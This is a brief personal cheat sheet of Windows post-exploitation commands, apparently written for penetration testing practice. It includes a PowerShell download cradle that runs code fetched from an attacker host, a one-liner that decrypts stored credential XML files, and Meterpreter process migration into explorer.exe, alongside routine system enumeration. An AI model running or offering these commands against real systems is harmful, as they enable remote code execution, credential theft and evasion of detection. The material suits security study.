---
layout:     post
author:     0x5c4r3
type: docs
permalink: Windows_General_Shit
---

<span style="font-size: 35px; color:red"><b>Useful General Stuff</b></span>
&nbsp;

<span style="font-size: 25px; color:white"><b>Download Cradle</b></span>
```shell
Invoke-WebRequest -Uri "http://<IP>/file" -OutFile "C:\path\file"
```
OR
```
iex((new-object system.net.webclient).downloadstring('http://<ATTACKER_IP>/run.txt'))
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Windoes see all directories (also hidden ones)</b></span>
```
dir -force
```
or
```powershell
tree /a /f
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>PowerShell Stored Password in .XML</b></span>
To Decrypt:
```
$cred = Import-CliXml -Path <CREDENTIALS.XML>; $cred.GetNetworkCredential() | Format-List *;
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Powershell enumerate running Processes</b></span>
```
Get-Service | where {$_.Status -eq "Running"}
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Get OS Version</b></span>
```
[environment]::OSVersion.Version
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Get OS Architecture</b></span>
```
[Environment]::Is64BitOperatingSystem
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Migrate With Metasploit</b></span>
Within meterpreter:
```shell
ps | grep <program.exe>
migrate <PID>
```
(good example of process to migrate to is `explorer.exe`)
